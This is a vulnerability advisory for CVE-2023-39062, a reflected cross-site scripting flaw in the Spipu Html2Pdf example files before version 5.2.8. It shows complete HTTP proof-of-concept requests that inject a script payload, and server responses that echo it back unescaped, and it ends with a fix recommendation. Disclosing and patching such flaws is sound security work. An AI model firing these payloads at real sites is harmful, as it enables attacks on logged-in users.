# CVE-2023-39062
Spipu Html2Pdf < 5.2.8 - XSS vulnerabilities in example files. 

## Description

Cross-Site-Scripting (XSS) vulnerability in Spipu Html2Pdf example files. This vulnerability allows an attacker to execute untrusted JavaScript code in the context of the currently logged-in user.

The vulnerability exists in any parameter that is passed to the `example9.php` and `forms.php` example files.

Example request to `forms.php` script:
```
GET /html2pdf/examples/res/forms.php?test=abc"><script>alert(document.domain)</script> HTTP/1.1
Host: example.afine.com
Cookie: PHPSESSID=oiqo2oopiqt88teqgfb0a23vk0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```
Server response:
```
HTTP/1.1 200 OK
Server: Apache
Content-Length: 2215
Connection: close
Content-Type: text/html; charset=UTF-8

[...]

<page footer="form">
    <h1>Test de formulaire</h1><br>
    <br>
    <form action="http://example.afine.com:443/html2pdf/examples/res/forms.php?test=abc"><script>alert(document.domain)</script>">
        <input type="hidden" name="test" value="1">

[...]
```

Example request to `example9.php` script:
```
GET /html2pdf/examples/exemple09.php?test=/"><script>alert(document.domain)</script>abc/?nom=1 HTTP/1.1
Host: example.afine.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```

Server response:
```
HTTP/1.1 200 OK
Date: Sat, 08 Jul 2023 18:32:51 GMT
Server: Apache
X-Powered-By: PHP/7.4.8
Content-Length: 795
Connection: close
Content-Type: text/html; charset=UTF-8

[...]

<body>
<br>
Ceci est un exemple de génération de PDF via un bouton :)<br>
<br>
<img src="http://example.afine.com/html2pdf/examples/exemple09.php?test=/"><script>alert(document.domain)</script>abc/res/exemple09.png.php?px=5&amp;py=20" alt="image_php" ><br>
<br>
<br>
        <form method="get" action="">

[...]
```

This issue was caused by a lack of sanitization of the provided request parameters. This problem has been fixed in Spipu Html2Pdf version 5.2.8.

## Affected versions
< 5.2.8 

## Advisory
Update Spipu Html2Pdf to 5.2.8 or newer.

### References
* https://github.com/spipu/html2pdf/blob/92afd81823d62ad95eb9d034858311bb63aeb4ac/CHANGELOG.md
* https://nvd.nist.gov/vuln/detail/CVE-2023-39062
